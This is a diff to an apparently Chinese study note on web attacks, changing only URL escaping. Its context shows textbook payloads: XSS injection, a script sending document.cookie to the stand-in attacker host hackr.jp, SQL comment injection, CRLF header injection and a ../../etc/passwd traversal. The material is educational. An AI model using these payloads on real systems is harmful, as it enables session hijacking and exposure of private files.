@@ -25,12 +25,12 @@
 通过提交的信息中带入 js 脚本，执行操作或者引入三方 js 。
 
 正常请求：<br />
-http&#58;//example.jp/login?ID="haha"<br />
+http:&#47;&#47;example.jp/login?ID="haha"<br />
 正常显示：<br />
 &lt;input type="text" name="ID" value="yama" />
 
 攻击请求：<br />
-http&#58;//example.jp/login?ID=">&lt;script>var+f=document.getElementById("login");&lt;/script>"<br />
+http:&#47;&#47;example.jp/login?ID=">&lt;script>var+f=document.getElementById("login");&lt;/script>"<br />
 攻击显示：<br />
 &lt;input type="text" name="ID" value="">&lt;script>var+f=document.getElementById("login");&lt;/script>
 
@@ -39,17 +39,17 @@ http&#58;//example.jp/login?ID=">&lt;script>var+f=document.getElementById("login
 恶意三方脚本执行。
 
 如下：<br />
-var content = escape(document.cookie);<br />document.write("&lt;img src=http&#58;//hackr.jp/?");<br />document.write(content);<br />document.write(">");<br />
+var content = escape(document.cookie);<br />document.write("&lt;img src=http:&#47;&#47;hackr.jp/?");<br />document.write(content);<br />document.write(">");<br />
 
 ### SQL 注入攻击
 
 正常请求：<br />
-http&#58;//example.jp/search?q=haha<br />
+http:&#47;&#47;example.jp/search?q=haha<br />
 正常执行：<br />
 SELECT * FROM bookTbl WHERE author = 'haha' and flag = 1;
 
 攻击请求：<br />
-http&#58;//example.jp/search?q=haha‘ --<br />
+http:&#47;&#47;example.jp/search?q=haha‘ --<br />
 攻击显示：<br />
 SELECT * FROM bookTbl WHERE author = 'haha' --’ and flag = 1;<br />
 flag = 1 的条件被忽略
@@ -68,9 +68,9 @@ my $adr = $q->param('mailaddress');<br />open(MAIL, "| /usr/sbin/sendmail $adr"
 ### HTTP 首部注入攻击
 
 http 头部信息：<br />
-Location: http&#58;//www.example.com/a.cgi?q=101%0D%0ASet-Cookie:+SID=123456789
+Location: http:&#47;&#47;www.example.com/a.cgi?q=101%0D%0ASet-Cookie:+SID=123456789
 
-%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http&#58;//hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。
+%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http:&#47;&#47;hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。
 
 ### HTTP 响应截断攻击
 
@@ -93,6 +93,6 @@ bob@hackr.jp%0D%0A%0D%0ATest Message
 
 ### 目录遍历攻击
 
-http&#58;//example.com/read.php?log=../../etc/passwd
+http:&#47;&#47;example.com/read.php?log=../../etc/passwd
 
 查询字段为了读取攻击者盯上的 /etc/passwd 文件，会从 /www/log/ 目录开始定位相对路径。如果这份 read.php 脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。
